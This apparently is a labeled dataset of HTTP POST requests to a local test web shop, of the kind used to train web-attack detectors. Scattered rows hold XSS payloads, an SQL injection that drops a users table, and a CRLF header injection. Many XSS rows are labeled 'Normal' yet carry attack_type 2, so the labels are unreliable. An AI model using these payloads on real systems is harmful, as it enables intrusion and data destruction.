Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,length,content,classification,URL,attack_type
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=582FD32FBF5EB3CDF125073A6BE3FFC9,application/x-www-form-urlencoded,Connection: close,Content-Length: 65,modo=entrar&login=labossie2&pwd=carm�nea&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F1DF6FD1B6052B07E49CB85FBD7B2E66,application/x-www-form-urlencoded,Connection: close,Content-Length: 258,"<figure onmouseup=""alert(1)"">test</figure>",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=FE7634AA23AC5FC029E2AD0BEC422CFC,application/x-www-form-urlencoded,Connection: close,Content-Length: 55,"id=<SCRIPT>alert(""Paros"");</SCRIPT>",1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BCF08944D7E35C02C6B27AB114717152,application/x-www-form-urlencoded,Connection: close,Content-Length: 90,modo=insertar&precio=9043&B1=any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=AF8E41DD553D68D28E3496CB93152F48,application/x-www-form-urlencoded,Connection: close,Content-Length: 67,"<A HREF=""http://0102.0146.0007.00000223/""></A>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2B3EAA0D01A5C3F40C8F57F49CB141C3,application/x-www-form-urlencoded,Connection: close,Content-Length: 252,modo=registro&login=jobyna&password=CAB5254A&nombreA=Amru&apellidos=Membrives+Larragoiti&email=tandy-thate@viscotek.rs&dni=16093683P&direccion=C/+Lucentum+86+&ciudad=Salas+de+los+Infantes&cp=25400&provincia=Segovia&ntc=2519318826209754&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5660F2BAF08DAC3CDEABF8C80C9AEA49,application/x-www-form-urlencoded,Connection: close,Content-Length: 46,modo=insertar&precio=6195&B1=Pasar+por+caja/,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6EC9812BCD009991297921791E695610,application/x-www-form-urlencoded,Connection: close,Content-Length: 245,"modo=registro&login=arabella&password=piel&nombre=Christian&apellidos=Zachrisson+Satalia&email=kouraviev@socimi.com.gl&dni=57418420R&direccion=Einstein+185,+6?F&ciudad=Milmarcos&cp=48210&provincia=Palencia&ntc=1215876112217091&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=823B172269A0FB6DE0D300C7D20F3F8C,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<map draggable=""true"" ondragstart=""alert(1)"">test</map>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=664602D42DFA344BA32B1E4C03F43F3D,application/x-www-form-urlencoded,Connection: close,Content-Length: 259,"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1C6E3F211AB8E96A20680016E325E586,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=trixi5&pwd=cel�cola&rememberA=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=FAC478777352AFA5646AA4FAED8BD242,application/x-www-form-urlencoded,Connection: close,Content-Length: 39,modo=insertar&precioA=8345&B1=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1A5EB60AF27578B73B240AD7F6618E2C,application/x-www-form-urlencoded,Connection: close,Content-Length: 69,idA=1&nombre=Vino+Rioja&precio=100&cantidad=45&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9E74B69D84827A99ED17E60EDB01ADED,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,modo=entrar&login=sutphen&pwd=qui0g6n16si2o&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8FC4D8A489B8E5FCCE9FB6E86636C578,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<content oncopy=""alert(1)"" contenteditable>test</content>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A0AC68E9DD3C25C27F076081D6F88608,application/x-www-form-urlencoded,Connection: close,Content-Length: 74,id=1/&nombre=Queso+Manchego&precio=85&cantidad=52&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=207B64573F465C7A76146073982CF74D,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=1096&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C1D217F119A254CDE7388C6333C1CBA5,application/x-www-form-urlencoded,Connection: close,Content-Length: 229,"<noframes onmouseup=""alert(1)"">test</noframes>",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=67487BB9CBB2CB5192F2265E08635DE8,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=5596&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=452EBC84726741F7DCD3C1CEE03CBF10,application/x-www-form-urlencoded,Connection: close,Content-Length: 57,modo=entrar&login=eimile&pwd=161que&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=83BB27C9FC355A69181422831074F6AB,application/x-www-form-urlencoded,Connection: close,Content-Length: 244,"modo=registro&login=loewen&password=ovIl&nombre=Reagan@40&apellidos=Piulachs+Casaramon&email=diogene@acch-portugal.mq&dni=29385199P&direccion=C/+Huesca,+171+&ciudad=Luz�n&cp=15863&provincia=Valladolid&ntc=0586261319391409&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=812982EB9756EB7CFF9E53F31DB6EE0B,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<table onmouseenter=""alert(1)"">test</table>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=418A66967C4422750A06D2ECEF2D7444,application/x-www-form-urlencoded,Connection: close,Content-Length: 78,id=3&nombre=Jam�n+Ib�rico&precio=100&cantidad=@40&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=ECA0F535B965C10BC43CB2A8FBBB1194,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=95&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=68A635EE495628A70566E765AA81FAA2,application/x-www-form-urlencoded,Connection: close,Content-Length: 58,modo=entrar&login=fady&pwd=A8O8decer&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E5AAE5090104C6A9384939DB8C6BAF5D,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,"<frameset onclick=""alert(1)"">test</frameset>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=271AF1D7E2ACB1635633674F34C83C8C,application/x-www-form-urlencoded,Connection: close,Content-Length: 254,modo=registro&login=zeng&password=DeMon�latRa&nombre=Ammiel&apellidos=Derch+Mallol&email=hole@chicashumedas.at&dni=23531966E&direccion=General+Casta�os+180+9-E&ciudad=Sant+Jaume+de+Llierca&cp=17800&provincia=Zamora&ntc=1819477389412406&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=051EA970E1C437581EB54AA32258D028,application/x-www-form-urlencoded,Connection: close,Content-Length: 75,modo=entrar&login=k/lashins&pwd=preconizac!i�n&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=402FA1F8DCA60E990F45765DEBE863CC,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,"<img onclick=""alert(1)"">test</img>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8EBF79F361EF5C06D5BECE674B643562,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=6538&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EEE1F1C3E7E906796FA1D06022D61E3E,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=6736&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4A142697A3D736E4003E829096D58192,application/x-www-form-urlencoded,Connection: close,Content-Length: 74,"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1CAC61463061C5B0923BD7E2D7E645AA,application/x-www-form-urlencoded,Connection: close,Content-Length: 68,"<td onmouseup=""alert(1)"">test</td>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=57B7F938970E9E936874BEA7872465BD,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,modo=entrar&login=patenaud&pwd=Lor81a5o&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E1B32607EEE79EECEF3637EE9E9851A7,application/x-www-form-urlencoded,Connection: close,Content-Length: 250,"modo=registro&login=dowd&password=.eXCRetorIa&nombre=Bernardette&apellidos=Cabr�&email=scanell@clichotel.kw&dni=50645313A&direccion=Pl.+Constitucion,+61+&ciudad=Herguijuela+del+Campo&cp=47260&provincia=Albacete&ntc=5827164850982375&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F1D54ABFE2FD45F46D35E8AC0A2150D7,application/x-www-form-urlencoded,Connection: close,Content-Length: 236,modo=registro&login=lrcrtp&password=a9oma39e&nombre=Angelo&apellidos=Merinas&email=waits@neotelecom.c@l&dni=17048909K&direccion=Rafael+Orozco+141+12?H&ciudad=Valga��n&cp=02141&provincia=Huesca&ntc=1343607497132758&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=93C8AAD473F59A6A0F51B82ECA91CCAC,application/x-www-form-urlencoded,Connection: close,Content-Length: 313,"modo=registro&login=suthers&password=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Ren�e&apellidos=Aldeta+Marnetti&email=patterson@arrsys.ke&dni=88453156D&direccion=Camino+De+Los+Robles,+8+&ciudad=Caparroso&cp=43694&provincia=Castell�n&ntc=4200323097821168&B1=Registrar",1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=42C7769CB044CF917B78E1A27226C7E5,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
